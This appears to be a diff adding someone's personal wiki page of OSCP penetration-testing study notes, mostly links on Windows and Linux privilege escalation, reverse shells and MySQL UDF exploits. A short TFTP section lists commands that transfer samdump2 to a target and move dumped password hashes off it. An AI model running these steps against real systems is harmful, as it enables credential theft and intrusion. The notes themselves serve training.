@@ -1,0 +1,86 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2018-11-14T11:26:19+05:30
+
+====== Approach ======
+Created Wednesday 14 November 2018
+
+
+**CINAP TNOD**
+
+**Windows Priv Esc-**
+Powerup - vaibhav - https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
+http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
+fuzzy security - http://www.fuzzysecurity.com/tutorials/16.html
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+https://www.google.co.in/search?q=windows+privilege+escalation	
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+https://guif.re/windowseop
+Using Metasploit- http://www.fuzzysecurity.com/tutorials/13.html
+
+Bypass Msbuild.exe - App Locker - https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/
+Certutil for delivery of files - http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html
+Windows Service pack exploits- https://github.com/abatchy17/WindowsExploits
+Windows meterpreter priv escalation exploit- https://hk.saowen.com/a/40fef3c80502ae6a4eceacaacaf3f40f3806e3c0568259030e223936d7f67704
+
+Hack windows XP without meterpreterms08-067- https://www.youtube.com/watch?v=qD-4S3KDJoQ
+
+**Linux PrivEsc:**
+**gotmilk** - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+This script outputs lot of info about the box and even suggests some public exploits that may work (although they have rarely worked) but requires python installed on box:
+https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123
+I prefer this bash script for enumeration (run with `-t` parameter for thorough analysis):
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+Understanding etc/passwd file format - https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/
+SUID - Priv Esc- https://pentestlab.blog/category/privilege-escalation/
+SUDO - Priv Esc - https://touhidshaikh.com/blog/?p=790
+Priv Esc- suid - https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
+Exploit- Priv Esc- https://payatu.com/guide-linux-privilege-escalation/
+Reverse Shell - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+Samba - https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#smb-enumeration-tools
+Using . in Path - https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+CronTab - https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/
+LFI Tricks- https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html
+NFS - https://www.tecmint.com/how-to-setup-nfs-server-in-linux/
+Mysql UDF Exploit - Priv esc - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
+MySql UDF Exploit windows -https://osandamalith.com/2018/02/11/mysql-udf-exploitation/
+MySQL - Raptor Udf.c - https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf.c
+MySql UDF Exploit - https://www.facebook.com/notes/security-training-share/mysql-root-to-system-root-with-lib_mysqludf_sys-for-windows-and-linux/865458806817957/
+MSSQL to RCE - https://www.tarlogic.com/en/blog/red-team-tales-0x01/
+One Liner Reverse shell - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+SSH authorized key - http://blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/
+Editing etc/passwd file priv esc - https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
+Spawning a TTY shell
+https://netsec.ws/?p=337
+Ways to Download a file
+https://blog.netspi.com/15-ways-to-download-a-file/	
+
+https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/
+Best Enumeration - http://www.0daysecurity.com/penetration-testing/enumeration.html
+http://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/
+1. **Ctf time, **Vulnhub - Beginner, Intermediate
+2. Buffer Overflow
+3. tftp, ftp, smtp
+TFTP- https://null-byte.wonderhowto.com/how-to/hack-like-pro-using-tftp-install-malicious-software-target-0157547/
+	a. mkdir /tftpboot
+	b. leafpad /etc/default/atftpd
+	c. /etc/init.d/atftpd restart
+	d. cp samdump2 /tftpboot
+	e. nc 192.168.1.121 6996
+	f. tftp -i GET 192.168.1.119 samdump2
+	g. tftp -i PUT 192.168.1. 119 hashes.txt
+5. **Send and recieve files from - 1. Linux to Windows, 2. Linux to Linux, 3. Other sources to windows and linux.** 
+6. **PDF- sqli, lfi , rfi to root**
+MSSQL to RCE
+https://www.tarlogic.com/en/blog/red-team-tales-0x01/
+6. Tcp and Udp scans
+7. Read OSCP guidelines
+
+
+Machines-
+humble
+pain
+sufference
+
+#Twitter - Follow, oscp writeups- approach
